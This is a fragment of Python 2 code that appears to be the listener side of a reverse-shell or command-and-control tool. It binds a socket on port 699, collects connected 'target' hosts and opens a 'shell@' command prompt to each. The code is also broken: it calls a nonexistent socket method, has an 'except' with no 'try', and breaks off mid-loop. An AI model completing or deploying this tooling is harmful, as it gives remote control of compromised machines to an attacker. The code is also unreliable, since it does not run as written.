
import socket, os, sys

tgthosts = [] #holds all connected addresses
tgthost = '0.0.0.0'
tgtport = int(699)

def create_socket():
    #function creates socket
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(None) #no time out errors
        s.sockopt(socket.SOL_SOCKET, socket.SOL_REUSEADDR, 1) #reuse socket even in sleep mode
        print "[*] socket created successfully on server"
    except socket.error as msg:
        print "[-] Socket generation failed with " + str(msg)
        sys.exit([1])
        return 0

#socket binding to target host
def sock_bind():
    global s
    s.bind((tgthost, int(tgtport)))
    s.listen(20)
    except socket.error() as msg:
        print "[-] Socket binding error " + str(msg) + "Retrying............."
        sys.exit([0])
        return
def sock_accept():
    #function accepts incoming connections
    global tgthosts
    try:
        while True:
            conn, addr = s.accept()
            #eliminate timeout errors 
            conn.setblocking(None)
            #add host to tgthosts
            tgthosts.append(conn)
            #start session on tgt
            cmd_session = raw_input("shell@" + str(tgthost))

